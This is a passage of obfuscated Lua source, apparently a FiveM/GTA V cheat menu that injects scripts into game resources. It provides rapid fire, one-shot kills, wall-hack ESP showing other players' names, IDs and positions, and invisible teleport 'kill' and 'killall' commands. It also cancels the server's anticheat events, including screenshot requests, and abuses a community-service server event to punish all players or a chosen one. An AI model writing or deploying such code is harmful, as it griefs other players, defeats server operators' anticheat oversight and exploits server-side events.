    ]]);MachoMenuNotification("Spread","No Spread OFF");end);local v180=false;MachoMenuCheckbox(v172,"Rapid Fire",function() local v447=0 -0 ;while true do if (v447==1) then MachoMenuNotification("Rapid Fire","Rapid Fire ON");break;end if (v447==0) then v180=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        rapidFireActive = true
        CreateThread(function()
            while rapidFireActive do
                Wait(0)
                DisablePlayerFiring(PlayerPedId(), true)
                if IsDisabledControlPressed(0, 24) then
                    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local rad = 0.01745329
                    local rx = camRot.x * rad
                    local rz = camRot.z * rad
                    local fdx = -math.sin(rz) * math.cos(rx)
                    local fdy = math.cos(rz) * math.cos(rx)
                    local fdz = math.sin(rx)
                    local tx = camPos.x + fdx * 200
                    local ty = camPos.y + fdy * 200
                    local tz = camPos.z + fdz * 200
                    ShootSingleBulletBetweenCoords(camPos.x, camPos.y, camPos.z, tx, ty, tz, 5, true, weapon, PlayerPedId(), true, true, 24000.0)
                end
            end
        end)
    ]]);v447=2 -1 ;end end end,function() local v448=0 + 0 ;while true do if (v448==(3 -2)) then MachoMenuNotification("Rapid Fire","Rapid Fire OFF");break;end if (v448==0) then v180=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        rapidFireActive = false
    ]]);v448=2 -1 ;end end end);local v181=false;MachoMenuCheckbox(v172,"One Shot Kill",function() v181=true;SetPlayerWeaponDamageModifier(PlayerId(),8846 + 1153 );MachoMenuNotification("One Shot","One Shot Kill ON");end,function() local v449=1807 -(518 + 1289) ;while true do if (v449==1) then MachoMenuNotification("One Shot","One Shot Kill OFF");break;end if (v449==(0 -0)) then v181=false;SetPlayerWeaponDamageModifier(PlayerId(),1);v449=1;end end end);MachoMenuButton(v172,"Remove All Weapons",function() local v450=0 + 0 ;while true do if (v450==(0 -0)) then RemoveAllPedWeapons(PlayerPedId(),true);MachoMenuNotification("Weapons","All weapons removed!");break;end end end);MachoMenuButton(v172,"Refill Ammo",function() local v451=0 + 0 ;local v452;local v453;while true do if ((470 -(304 + 165))==v451) then if ((v453~=nil) and (v453~=(0 + 0)) and (v453~=GetHashKey("WEAPON_UNARMED"))) then local v829=0;while true do if (v829==0) then SetPedAmmo(v452,v453,10159 -(54 + 106) );MachoMenuNotification("Ammo","Ammo refilled!");break;end end else MachoMenuNotification("Error","No weapon equipped!");end break;end if (v451==0) then v452=PlayerPedId();v453=GetSelectedPedWeapon(v452);v451=1;end end end);local v182=false;MachoMenuCheckbox(v172,"Weapon RGB",function() v182=true;local v454={0 + 0 ,1017 -(10 + 1006) ,1 + 1 ,3,1037 -(912 + 121) ,5,6,7};local v455=1 -0 ;MachoInjectResource2(NewThreadNs,"monitor",[[
        weaponRGBActive = true
        local tints = {0, 1, 2, 3, 4, 5, 6, 7}
        local index = 1
        CreateThread(function()
            while weaponRGBActive do
                Wait(125)
                local ped = PlayerPedId()
                local weapon = GetSelectedPedWeapon(ped)
                if weapon ~= nil and weapon ~= 0 and weapon ~= GetHashKey("WEAPON_UNARMED") then
                    SetPedWeaponTintIndex(ped, weapon, tints[index])
                    index = index + 1
                    if index > #tints then index = 1 end
                end
            end
        end)
    ]]);MachoMenuNotification("Weapon","Weapon RGB ON");end,function() v182=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        weaponRGBActive = false
    ]]);MachoMenuNotification("Weapon","Weapon RGB OFF");end);print("[Weapons] Tab loaded!");local v183=MachoMenuAddTab(v4,"ESP Menu");local v184=MachoMenuGroup(v183,"ESP Menu",v3,9,(v1.x-v3) + 28 + 122 ,v1.y);MachoMenuCheckbox(v184,"ESP",function() MachoInjectResource("any",[[
        local espActive = true
        CreateThread(function()
            while espActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local targetPed = GetPlayerPed(i)
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(myCoords - targetCoords)

                        if distance < 130.0 then
                            local name = GetPlayerName(i)
                            local serverId = GetPlayerServerId(i)
                            local text = serverId .. " | " .. name

                            if NetworkIsPlayerTalking(i) then
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.2, text, 255, 100, 100)
                            else
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.2, text, 255, 255, 255)
                            end

                            if IsPedInAnyVehicle(targetPed, false) then
                                local veh = GetVehiclePedIsUsing(targetPed)
                                local model = GetEntityModel(veh)
                                local vehName = GetLabelText(GetDisplayNameFromVehicleModel(model))
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "Vehicle: " .. vehName, 180, 180, 180)
                            end
                        end
                    end
                end

                Wait(0)
            end
        end)

        function DrawText3D(x, y, z, text, r, g, b)
            SetTextScale(0.35, 0.35)
            SetTextFont(4)
            SetTextProportional(1)
            SetTextColour(r, g, b, 215)
            SetTextEntry("STRING")
            SetTextCentre(true)
            AddTextComponentString(text)
            SetDrawOrigin(x, y, z, 0)
            DrawText(0.0, 0.0)
            ClearDrawOrigin()
        end
    ]]);end,function() MachoInjectResource("any",[[
        espActive = false
    ]]);end);MachoMenuCheckbox(v184,"ESP Box",function() MachoInjectResource("any",[[
        espBoxActive = true
        CreateThread(function()
            while espBoxActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local ra = { r = 255, g = 0, b = 0 }

                        local LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        local LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        local LineTwoBegin = LineOneEnd
                        local LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        local LineThreeBegin = LineTwoEnd
                        local LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        local LineFourBegin = LineThreeEnd
                        local LineFourEnd = LineOneBegin

                        local TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        local TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        local TLineTwoBegin = TLineOneEnd
                        local TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        local TLineThreeBegin = TLineTwoEnd
                        local TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        local TLineFourBegin = TLineThreeEnd
                        local TLineFourEnd = LineOneBegin

                        local ConnectorOneBegin = TLineThreeEnd
                        local ConnectorOneEnd = LineThreeEnd
                        local ConnectorTwoBegin = TLineTwoEnd
                        local ConnectorTwoEnd = LineTwoEnd
                        local ConnectorThreeBegin = TLineOneBegin
                        local ConnectorThreeEnd = LineOneBegin
                        local ConnectorFourBegin = TLineOneEnd
                        local ConnectorFourEnd = LineOneEnd

                        local lines = {
                            {LineOneBegin, LineOneEnd}, {LineTwoBegin, LineTwoEnd},
                            {LineThreeBegin, LineThreeEnd}, {LineFourBegin, LineFourEnd},
                            {TLineOneBegin, TLineOneEnd}, {TLineTwoBegin, TLineTwoEnd},
                            {TLineThreeBegin, TLineThreeEnd}, {TLineFourBegin, TLineFourEnd},
                            {ConnectorOneBegin, ConnectorOneEnd}, {ConnectorTwoBegin, ConnectorTwoEnd},
                            {ConnectorThreeBegin, ConnectorThreeEnd}, {ConnectorFourBegin, ConnectorFourEnd}
                        }

                        for _, line in pairs(lines) do
                            DrawLine(line[1].x, line[1].y, line[1].z, line[2].x, line[2].y, line[2].z, ra.r, ra.g, ra.b, 255)
                        end
                    end
                end

                Wait(0)
            end
        end)
    ]]);end,function() MachoInjectResource("any",[[
        espBoxActive = false
    ]]);end);MachoMenuCheckbox(v184,"Detail ESP Info",function() MachoInjectResource("any",[[
        espInfoActive = true
        CreateThread(function()
            while espInfoActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local x, y, z = table.unpack(GetEntityCoords(pPed))
                        local cx, cy, cz = table.unpack(myCoords)
                        local distance = #(myCoords - vector3(x, y, z))
                        
                        local message = string.format("Name: %s\nPlayer ID: %d\nDist: %.1f",
                            GetPlayerName(i),
                            GetPlayerServerId(i),
                            i,
                            distance
                        )

                        if IsPedInAnyVehicle(pPed, true) then
                            local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                            message = message .. "\nVeh: " .. VehName
                        end

                        local r, g, b = 255, 255, 255
                        if NetworkIsPlayerTalking(i) then
                            r, g, b = 0, 255, 0
                        end

                        DrawText3D(x, y, z + 1.0, message, r, g, b)
                    end
                end
                Wait(0)
            end
        end)
    ]]);end,function() MachoInjectResource("any",[[
        espInfoActive = false
    ]]);end);MachoMenuCheckbox(v184,"ESP Lines",function() MachoInjectResource("any",[[
        espLinesEnabled = true
        CreateThread(function()
            while espLinesEnabled do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local px, py, pz = table.unpack(GetEntityCoords(pPed))

                        local ra = { r = 255, g = 0, b = 0 }
                        DrawLine(myCoords.x, myCoords.y, myCoords.z, px, py, pz, ra.r, ra.g, ra.b, 255)
                    end
                end

                Wait(0)
            end
        end)
    ]]);end,function() MachoInjectResource("any",[[
        espLinesEnabled = false
    ]]);end);local v185=false;MachoMenuCheckbox(v184,"DOT Crosshair",function() crosshair=false;crosshairc=false;v185=true;CreateThread(function() while v185 do local v683=0;while true do if (v683==(0 -0)) then Citizen.Wait(0 -0 );DrawTxt("~r~.",0.4968 + 0 ,0.478 -0 );break;end end end end);end,function() v185=false;end);function DrawTxt(v456,v457,v458) local v459=186 -(165 + 21) ;while true do if (v459==0) then SetTextFont(115 -(61 + 50) );SetTextProportional(1 + 0 );SetTextScale(0 -0 ,0.5 -0 );SetTextColour(101 + 154 ,1460 -(1295 + 165) ,0,255);v459=1;end if (v459==(1 + 1)) then SetTextEntry("STRING");AddTextComponentString(v456);DrawText(v457,v458);break;end if (v459==1) then SetTextDropshadow(0,0 + 0 ,0,1397 -(819 + 578) ,255);SetTextEdge(1,0,1402 -(331 + 1071) ,743 -(588 + 155) ,1537 -(546 + 736) );SetTextDropShadow();SetTextOutline();v459=1939 -(1834 + 103) ;end end end MachoInjectResource("any",[[
-- Kill all
RegisterCommand("killall", function()
    local playerPed = PlayerPedId()
    local oldCoords = GetEntityCoords(playerPed)

    -- Make invisible
    SetEntityVisible(playerPed, false, false)

    -- Spawn weapon
    GiveWeaponToPed(playerPed, GetHashKey("WEAPON_APPISTOL"), 9999, false, true)
    SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_APPISTOL"), true)
    SetPedInfiniteAmmo(playerPed, true, GetHashKey("WEAPON_APPISTOL"))
    SetPedCurrentWeaponVisible(playerPed, false, false, false, true)

    Citizen.CreateThread(function()
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)

            if targetPed ~= playerPed and DoesEntityExist(targetPed) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(targetCoords - oldCoords)

                if distance <= 500.0 then
                    -- Teleport next to them
                    SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false, false, false, false)

                    -- Deal damage + bullet effect
                    for i = 1, 5 do
                        ApplyDamageToPed(targetPed, 200, false)
                        ShootSingleBulletBetweenCoords(
                            targetCoords.x, targetCoords.y, targetCoords.z + 0.1,
                            targetCoords.x, targetCoords.y, targetCoords.z + 0.2,
                            250,
                            0,
                            GetHashKey("WEAPON_APPISTOL"),
                            playerPed,
                            true,
                            false,
                            -1.0
                        )
                        Citizen.Wait(50)
                    end

                    Citizen.Wait(150)
                end
            end
        end

        -- Cleanup
        RemoveWeaponFromPed(playerPed, GetHashKey("WEAPON_APPISTOL"))
        SetEntityVisible(playerPed, true, false)
        SetEntityCoords(playerPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
    end)
end)
]]);MachoInjectResource("monitor",[[
    RegisterNetEvent('Anticheat:CheckJumping')
    AddEventHandler('Anticheat:CheckJumping', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:punishFromClient')
    AddEventHandler('Anticheat:punishFromClient', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:peerInitialized')
    AddEventHandler('Anticheat:peerInitialized', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:requestIntialization')
    AddEventHandler('Anticheat:requestIntialization', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:requestClientScreenshot')
    AddEventHandler('Anticheat:requestClientScreenshot', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:peerInitialized')
    AddEventHandler('Anticheat:peerInitialized', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:nuiEvent')
    AddEventHandler('Anticheat:nuiEvent', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:pong')
    AddEventHandler('Anticheat:pong', function()
       CancelEvent()
    end)
]]);RegisterCommand("herkesekamu",function(v460,v461,v462) local v463=PlayerPedId();local v464=GetEntityCoords(v463);local v465=0;for v510,v511 in ipairs(GetActivePlayers()) do local v512=GetPlayerPed(v511);if (v512~=v463) then local v749=0;local v750;local v751;local v752;while true do if (v749==(0 + 0)) then v750=GetEntityCoords(v512);v751= #(v464-v750);v749=1;end if (v749==(2 -1)) then v752=GetPlayerServerId(v511);TriggerServerEvent("qb-communityservice:sendToCommunityService",v752,0);v749=1768 -(1536 + 230) ;end if (v749==2) then v465=v465 + (492 -(128 + 363)) ;Citizen.Wait(649 + 2401 );break;end end end end if (v465>(0 -0)) then TriggerEvent("chat:addMessage",{color={0,255,0},multiline=true,args={"System",v465   .. " FIX" }});else TriggerEvent("chat:addMessage",{color={255,0,1009 -(615 + 394) },multiline=true,args={"System","no ren!"}});end end,false);RegisterCommand("kamu",function(v466,v467,v468) local v469=tonumber(v467[1 + 0 ]);local v470=GetPlayerServerId(v469);TriggerServerEvent("qb-communityservice:sendToCommunityService",v469,22);TriggerEvent("chat:addMessage",{color={0,255,0},multiline=true,args={"System",v469   .. " id's player is Kamu mode" }});end,false);MachoInjectResource("any",[[
RegisterCommand("kill", function(source, args)
    local targetId = tonumber(args[1])
    if not targetId then return end

    local playerPed = PlayerPedId()
    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetId))

    if targetPed ~= 0 and DoesEntityExist(targetPed) then
        -- Save old coordinates
        local oldCoords = GetEntityCoords(playerPed)

        -- Teleport next to target
        local targetCoords = GetEntityCoords(targetPed)
        SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false, false, false, false)

        -- Spawn weapon (local only, server doesn't see)
        GiveWeaponToPed(playerPed, GetHashKey("WEAPON_APPISTOL"), 250, false, true)
        SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_APPISTOL"), true)
        SetPedInfiniteAmmo(playerPed, true, GetHashKey("WEAPON_APPISTOL"))

        -- Make weapon invisible
        SetPedCurrentWeaponVisible(playerPed, false, false, false, true)

        -- Silent kill
        Citizen.CreateThread(function()
            local coords = GetEntityCoords(targetPed)
            for i = 1, 5 do
                ApplyDamageToPed(targetPed, 200, false)
                ShootSingleBulletBetweenCoords(
                    coords.x, coords.y, coords.z + 0.1,
                    coords.x, coords.y, coords.z + 0.2,
                    250,
                    0,
                    GetHashKey("WEAPON_APPISTOL"),
                    playerPed,
                    true,
                    false,
                    -1.0
                )
                Citizen.Wait(50)
            end
        end)

        -- Remove weapon and return to old position
        Citizen.SetTimeout(2000, function()
            RemoveWeaponFromPed(playerPed, GetHashKey("WEAPON_APPISTOL"))
            SetEntityCoords(playerPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
        end)
    end
end)
]]);